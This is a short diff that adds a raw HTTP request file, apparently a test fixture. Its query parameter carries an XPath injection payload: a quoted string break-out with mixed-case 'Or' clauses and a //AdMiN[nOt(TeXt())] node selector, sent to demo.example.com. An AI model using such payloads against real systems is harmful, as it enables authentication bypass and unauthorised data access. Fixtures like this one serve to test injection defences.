@@ -1,0 +1,4 @@
+GET /a?cmd=x'%20Or%20//AdMiN[nOt(TeXt())]%20Or%20'Y HTTP/1.1
+Host: demo.example.com
+Connection: close
+
